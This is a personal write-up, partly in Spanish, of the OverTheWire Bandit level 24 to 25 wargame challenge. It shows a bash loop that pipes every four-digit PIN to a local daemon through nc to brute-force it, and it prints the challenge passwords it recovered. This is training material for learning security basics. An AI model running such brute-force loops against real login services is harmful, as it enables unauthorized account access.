# Bandit Level 24 → Level 25

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solucion

- hay que nviarle el password y pin de 4 digitos, la unica forma es pasar por todas las combinaciones

```
bandit24@bandit:~$ nc -v localhost 30002
localhost [127.0.0.1] 30002 (?) open
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 123
Wrong! Please enter the correct pincode. Try again.

```


```


mm no
for i in $(seq 0000 9999); do echo $i; done


echo {0000..0009}
0000 0001 0002 0003 0004 0005 0006 0007 0008 0009


 seq 0000 0009
0
1
2
3
4
5
6
7
8
9

for i in {0000..0009}; do  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009

for i in {0000..0009}; do  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done | nc localhost 30002


for i in {0000..9999}; do  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.


```

```bash
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

